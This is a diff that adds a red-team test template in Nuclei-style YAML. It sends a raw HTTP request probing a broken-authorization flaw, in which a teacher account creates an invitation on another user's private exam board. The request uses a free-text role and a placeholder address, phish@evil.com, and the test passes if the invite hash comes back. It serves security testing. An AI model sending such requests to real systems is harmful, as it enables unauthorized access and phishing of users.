@@ -1,0 +1,20 @@
+id: rt06-convite-banca-alheia-role-arbitrario
+info:
+  name: "TEACHER cria convite em banca PRIVADA alheia com role arbitrario e recebe o hash do convite"
+  author: redteam-sisdef
+  severity: medium
+  description: "POST /banca/convites/email: service nao confere ownership/visibilidade da banca e role e string livre (max 50). Resposta 201 devolve inviteHash; Poison ataque de phishing com texto de papel livre."
+  tags: redteam,authz,abuse
+http:
+  - raw:
+      - |
+        POST /banca/convites/email HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{TOKEN_TEACHER}}
+        Content-Type: application/json
+
+        {"bancaId":3,"email":"phish@evil.com","role":"CEO Supreme Hacker"}
+    matchers:
+      - type: status
+        status:
+          - 201
